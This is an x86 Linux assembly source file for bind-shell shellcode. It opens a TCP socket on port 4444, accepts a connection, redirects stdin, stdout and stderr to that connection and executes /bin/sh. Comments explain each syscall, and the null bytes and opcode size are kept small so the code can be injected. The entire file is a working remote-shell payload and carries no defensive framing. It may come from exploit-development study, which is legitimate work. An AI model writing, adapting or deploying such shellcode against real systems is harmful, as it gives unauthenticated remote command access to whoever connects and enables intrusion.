; shellcode assembly 
 
 
global _start:
 
section .text
 
_start:
; socketcall (0x66)
;   syscall SYS_SOCKET (0x01) - int socket(int domain, int type, int protocol);
xor eax, eax
xor ebx, ebx
mov al, 0x66
mov bl, 0x01
 
; pushing arguments to the stack backwards: int protocol (PF_INET, SOCK_STREAM, 0) 
xor edx, edx
push edx ; int domain
 
push 0x01 ; SOCK_STREAM
push 0x02 ; PF_INET (AF_INET and PF_INET is the same)
 
mov ecx, esp
 
; syscall
int 0x80
 
; save returned file descriptor from eax into esi for later use
mov esi, eax
 
; socketcall (0x66)
;   syscall BIND (0x02) - int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
mov al, 0x66
mov bl, 0x02
 
; pushing arguments to the stack backwards: 
; bind(sockid, (struct sockaddr *) &addrport, sizeof(addrport));
 
; xor edx, edx
push edx
push word 0x5c11 ; port 4444 
push word 0x02  ; PF_INET
 
mov ecx, esp
 
push 0x10       ; sockaddr length
push ecx        ; sockaddr pointer
push esi        ; saved socket descriptor 
 
mov ecx, esp
 
; syscall
int 0x80
 
; socketcall (0x66)
;   syscall  SYS_LISTEN (0x04) - int listen(int sockfd, int backlog);
mov al, 0x66
mov bl, 0x04
 
; pushing arguments to the stack backwards: 
; listen(sockid, 0);
push edx        ; push 0
 
push esi        ; socket file descriptor saved earlier in esi
 
mov ecx, esp
 
; syscall
int 0x80
 
; socketcall (0x66)
;   syscall SYS_ACCEPT (0x05) - int sock_accept = accept(sockid, 0, 0);
mov al, 0x66
mov bl, 0x05
 
push edx
push esi ; socket file descriptor saved earlier in esi
mov ecx, esp
 
; syscall
int 0x80
 
; save returned file descriptor from eax into esi for later use
mov esi, eax
 
; dup2 (0x3f)
;   0 ; stdin
 
; dup2 (0x3f)
;   1 ; stdout
 
; dup2 (0x3f)
;   2 ; stderr
; let's put all this in a loop
xor ecx, ecx
 
DUPCOUNT:
; (0 - stdin, 1 - stdout, 2 - stderr) dup2 - __NR_dup2                63
; int dup2(int oldfd, int newfd);
 
; xor eax, eax
mov al, 0x3f
 
; ebx (socket descriptor, being copied over from esi saved earlier)
; ecx will be calculated automatically based on the loop value
mov ebx, esi    ; saved socket descriptor
 
; syscall
int 0x80
 
inc cl
cmp cx, 2
jle DUPCOUNT    ; count until 2 is reached
 
 
; execve (0x0b) 
;   /bin//sh
xor eax, eax
; xor ebx, ebx
; sub esp, 8    ; reserve some bytes in the stack to work with
push eax        ; substituted sub esp, 8 to reduce opcode size
 
mov al, 0x0b
push 0x68732f2f ; //sh
push 0x6e69622f ; /bin
mov ebx, esp
 
xor ecx, ecx
 
; syscall
int 0x80
 
